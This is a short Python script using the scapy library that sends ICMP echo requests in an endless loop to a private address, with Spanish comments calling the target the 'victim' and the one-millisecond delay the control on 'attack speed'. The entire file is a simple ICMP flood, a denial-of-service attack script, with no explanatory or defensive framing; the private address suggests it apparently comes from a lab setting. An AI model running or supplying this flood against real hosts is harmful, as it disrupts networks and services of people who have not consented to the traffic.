from scapy.all import IP, ICMP, send
import time

target_ip = "10.0.2.15"  # IP de la víctima

while True:
    packet = IP(dst=target_ip) / ICMP()
    send(packet, verbose=0)
    print(f"[+] ICMP Echo Request sent to {target_ip}")
    time.sleep(0.001)  # Controla la velocidad del ataque
